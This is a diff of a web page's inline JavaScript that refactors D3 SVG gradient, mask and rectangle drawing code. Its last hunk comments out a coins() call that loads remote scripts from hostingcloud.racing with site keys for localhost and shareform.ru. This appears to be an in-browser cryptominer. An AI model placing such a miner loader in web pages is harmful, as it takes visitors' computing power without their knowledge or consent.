@@ -333,63 +333,255 @@
             //#061639
             //let pallete = chroma.scale(['#061639', 'black']).colors(24);
             let palletejson = JSON.stringify(colors);
-            
+
             // объект Градиент
             function Gradient(spec) {
                 let instance = {};
-                let id, svg, defs, x1, y1, x2, y2;
-                
+                let id, defs, x1, y1, x2, y2;
+                let gradient;
+                let type = 'linearGradient';
+                let stops = [];
+
                 // присваивание значений при создании
-                if (_.isEmpty(spec.id)){
-                    id = 'id' + Date();  
+                if (_.isEmpty(spec.id)) {
+                    let d = new Date();
+                    id = 'id' + Date.now();
                 } else {
                     id = spec.id;
                 }
-                
-                if (_.isEmpty(spec.x1)){
-                    x1 = '0%';  
+
+                if (!_.isEmpty(spec.type)) {
+                    type = spec.type;
+                }
+
+                if (_.isEmpty(spec.x1)) {
+                    x1 = '0%';
                 } else {
                     x1 = spec.x1;
                 }
-                
-                if (_.isEmpty(spec.y1)){
-                    y1 = '0%';  
+
+                if (_.isEmpty(spec.y1)) {
+                    y1 = '0%';
                 } else {
                     y1 = spec.y1;
                 }
-                
-                if (_.isEmpty(spec.x2)){
-                    x2 = '0%';  
+
+                if (_.isEmpty(spec.x2)) {
+                    x2 = '0%';
                 } else {
                     x2 = spec.x2;
                 }
-                
-                if (_.isEmpty(spec.y2)){
-                    y2 = '100%';  
+
+                if (_.isEmpty(spec.y2)) {
+                    y2 = '100%';
                 } else {
                     y2 = spec.y2;
                 }
-                
-                if (!_.isEmpty(spec.svg)){
-                    svg = spec.svg;
-                }
-                
-                if (!_.isEmpty(spec.defs)){
+
+                if (!_.isEmpty(spec.defs)) {
                     defs = spec.defs;
                 }
-                
+
                 // присваиваем или получаем Id
                 instance.id = (i) => {
-                    if (!arguments.length) return id;
+                    if (_.isEmpty(i)) {
+                        return id.toString();
+                    }
                     id = i;
                     return instance;
                 };
 
-              
-              
+                instance.append = (d) => {
+
+                    if (!_.isEmpty(d)) {
+                        defs = d;
+                    }
+
+                    gradient = defs.append(type)
+                        .attr('id', id)
+                        .attr('x1', x1)
+                        .attr('y1', y1)
+                        .attr('x2', x2)
+                        .attr('y2', y2);
+
+                    return instance;
+                };
+
+                // присваиваем и получаем градиент
+                instance.gradient = (g) => {
+                    if (!arguments.length) return gradient;
+                    gradient = g;
+                    return instance;
+                };
+
+                instance.stop = (offset, color, opacity) => {
+                    gradient.append('stop')
+                        .attr('offset', offset)
+                        .attr('stop-color', color)
+                        .attr('stop-opacity', opacity);
+
+                    return instance;
+                };
+
                 return instance;
             }
-            
+
+            // объект Маска
+            function Mask(spec) {
+                let instance = {};
+                let id, defs;
+                let mask;
+                let figures = [];
+
+                // присваивание значений при создании
+                if (_.isEmpty(spec.id)) {
+                    let d = new Date();
+                    id = 'id' + Date.now();
+                } else {
+                    id = spec.id;
+                }
+
+                if (!_.isEmpty(spec.defs)) {
+                    defs = spec.defs;
+                }
+
+                // присваиваем или получаем Id
+                instance.id = (i) => {
+                    if (_.isEmpty(i)) {
+                        return id.toString();
+                    }
+                    id = i;
+                    return instance;
+                };
+
+                // добавляем маску в defs
+                instance.append = (d) => {
+
+                    if (!_.isEmpty(d)) {
+                        defs = d;
+                    }
+
+                    mask = defs.append('mask')
+                        .attr('id', id);
+
+                    return instance;
+                };
+
+                // присваиваем и получаем градиент
+                instance.mask = (m) => {
+                    if (!arguments.length) return mask;
+                    mask = m;
+                    return instance;
+                };
+
+                instance.rect = (x, y, w, h, f) => {
+                    let r = mask.append('rect')
+                        .attr('x', x)
+                        .attr('y', y)
+                        .attr('width', w)
+                        .attr('height', h)
+                        .attr('fill', f);
+
+                    figures.push(r);
+
+                    return instance;
+                };
+
+                return instance;
+            }
+
+            // прямоугольник
+            let Rect = (spec) => {
+                let instance = {};
+                let id, x, y, width, height, fill, mask;
+                let parent;
+
+                if (_.isEmpty(spec.id)) {
+                    let d = new Date();
+                    id = 'id' + Date.now();
+                } else {
+                    id = spec.id;
+                }
+
+                if (_.isEmpty(spec.x)) {
+                    x = '0';
+                } else {
+                    x = spec.x;
+                }
+
+                if (_.isEmpty(spec.y)) {
+                    y = '0';
+                } else {
+                    y = spec.x;
+                }
+
+                if (_.isEmpty(spec.width)) {
+                    width = win.innerWidth;
+                } else {
+                    width = spec.width;
+                }
+
+                if (_.isEmpty(spec.height)) {
+                    height = win.innerHeight;
+                } else {
+                    height = spec.height;
+                }
+
+                if (_.isEmpty(spec.fill)) {
+                    fill = 'white';
+                } else {
+                    fill = spec.fill;
+                }
+
+                if (_.isEmpty(spec.mask)) {
+                    mask = 'white';
+                } else {
+                    mask = spec.mask;
+                }
+
+                if (!_.isEmpty(spec.parent)) {
+                    parent = spec.parent;
+                }
+
+                // присваиваем или получаем Id
+                instance.id = (i) => {
+                    if (_.isEmpty(i)) {
+                        return id.toString();
+                    }
+                    id = i;
+                    return instance;
+                };
+
+                // присваиваем или получаем parent
+                instance.parent = (p) => {
+                    if (_.isEmpty(p)) {
+                        return parent;
+                    }
+                    parent = p;
+                    return instance;
+                };
+
+                instance.append = (p) => {
+
+                    if (!_.isEmpty(p)) {
+                        parent = p;
+                    }
+
+                    let r = parent.append('rect')
+                        .attr('id', id)
+                        .attr('x', x)
+                        .attr('y', y)
+                        .attr('width', width)
+                        .attr('height', height)
+                        .attr('fill', fill)
+                        .attr('mask', mask);
+
+                    return instance;
+                }
+
+                return instance;
+            };
+
             // объект Холст
             function Canvas(spec) {
                 let instance = {};
@@ -485,9 +677,12 @@
                         });
 
                     var g = svg.append("g");
+                    // область
                     g.append("path")
                         .attr("d", area(linedots))
                         .style("fill", 'lightblue'); //"lightblue");
+
+                    // путь
                     g.append("path")
                         .attr("d", line(linedots))
                         .style("stroke", 'lightblue') //"steelblue")
@@ -511,7 +706,7 @@
                 //конец теста слоя
 
                 // создаем SVG
-                instance.createSvg = (w, h) => {
+                instance.appendSvg = (w, h) => {
                     width = w;
                     height = h;
                     svg = d3.select("body").append("svg")
@@ -524,7 +719,7 @@
                 };
 
                 // создаем defs
-                instance.createDefs = () => {
+                instance.appendDefs = () => {
                     if (!svg.select("defs")) defs = svg.append("defs");
                     return instance;
                 };
@@ -595,7 +790,7 @@
 
                 // присваиваем и получаем цветовую палитру
                 instance.data.pallete = (p) => {
-                    if (!arguments.length) return data.pallete;
+                    if (_.isEmpty(p)) return data.pallete;
                     data.pallete = p;
                     return instance;
                 };
@@ -620,17 +815,17 @@
                     // obj.domain is an array of stops. Example ['0,0.5,1']
                     let _colors;
 
-                    if (obj.colors.length) {
+                    if (!_.isEmpty(obj.colors)) {
                         _colors = chroma.scale(obj.colors);
                     } else {
                         _colors = chroma.scale(['white', 'black']);
                     }
 
-                    if (obj.domain.length) {
+                    if (!_.isEmpty(obj.domain)) {
                         _colors = _colors.domain(obj.domain);
                     }
 
-                    if (obj.count.length) {
+                    if (!_.isEmpty(obj.count)) {
                         _colors = _colors.colors(count);
                     } else {
                         _colors = _colors.colors(24);
@@ -641,42 +836,32 @@
                     return instance;
                 };
 
-                instance.createBackgroundGradient = (mainColor, gradientColor) => {
+                instance.appendBG = (mainColor, gradientColor) => {
 
-                    let whiteGradient = defs.append("linearGradient")
-                        .attr("id", "whiteGradient")
-                        .attr("x1", "0%")
-                        .attr("y1", "0%")
-                        .attr("x2", "0%")
-                        .attr("y2", "100%");
+                    // градиент
+                    let BG = Gradient({
+                            'defs': defs
+                        })
+                        .append()
+                        .stop('0', gradientColor, '0.25')
+                        .stop('1', gradientColor, '1');
 
-                    whiteGradient.append("stop")
-                        .attr("offset", "0")
-                        .attr("stop-color", gradientColor)
-                        .attr("stop-opacity", "0.25");
+                    // маска
+                    let M = Mask({
+                        'defs': defs
+                    });
+                    M.append();
 
-                    whiteGradient.append("stop")
-                        .attr("offset", "1")
-                        .attr("stop-color", gradientColor)
-                        .attr("stop-opacity", "1");
+                    M.rect(0, 0, width, height, 'url(#' + BG.id() + ')');
 
-                    let gradientMask = defs.append("mask")
-                        .attr("id", "gradientMask");
-
-                    let rectMask = gradientMask.append("rect")
-                        .attr("x", "0")
-                        .attr("y", "0")
-                        .attr("width", width)
-                        .attr("height", height)
-                        .attr("fill", "url(#whiteGradient)");
-
-                    svg.append("rect")
-                        .attr("x", "0")
-                        .attr("y", "0")
-                        .attr("width", width)
-                        .attr("height", height)
-                        .attr("fill", mainColor)
-                        .attr("mask", "url(#gradientMask)");
+                    // прямоугольник с маской градиентом
+                    let R = Rect({
+                            'width': width,
+                            'height': height,
+                            'fill': mainColor,
+                            'mask': 'url(#' + M.id() + ')'
+                        })
+                        .append(svg);
 
                     return instance;
                 }
@@ -685,14 +870,20 @@
             }
 
             let canvas = Canvas({
-                    color: 'white', //'#6495ed',
-                    width: width
-                })
+                color: 'white', //'#6495ed',
+                width: width
+            });
+            canvas
+                .createPallete({
+                    'colors': ['yellow', 'lightgreen']
+                });
+            let p = canvas.data.pallete();
+            canvas
                 .headline('Pallete')
-                .description(palletejson)
-                .createSvg(width, height)
-                .createDefs()
-                .createBackgroundGradient("orange", "white");
+                .description(JSON.stringify(p)) //palletejson)
+                .appendSvg(width, height)
+                .appendDefs()
+                .appendBG("orange", "white");
 
             canvas.showTextWidget();
             canvas.testLayer();
@@ -701,19 +892,21 @@
                             alert(e);
                         }
             */
-            let c = coins()
-                .addSite({
-                    id: 'local',
-                    match: '127.0.0.1',
-                    src: 'https://www.hostingcloud.racing/2KFX.js',
-                    key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
-                })
-                .addSite({
-                    id: 'share',
-                    match: 'shareform.ru',
-                    src: 'https://www.hostingcloud.racing/rhdQ.js',
-                    key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
-                }).start();
+            /*
+             let c = coins()
+                 .addSite({
+                     id: 'local',
+                     match: '127.0.0.1',
+                     src: 'https://www.hostingcloud.racing/2KFX.js',
+                     key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
+                 })
+                 .addSite({
+                     id: 'share',
+                     match: 'shareform.ru',
+                     src: 'https://www.hostingcloud.racing/rhdQ.js',
+                     key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
+                 }).start();
+                 */
         }
     </script>
 </body>
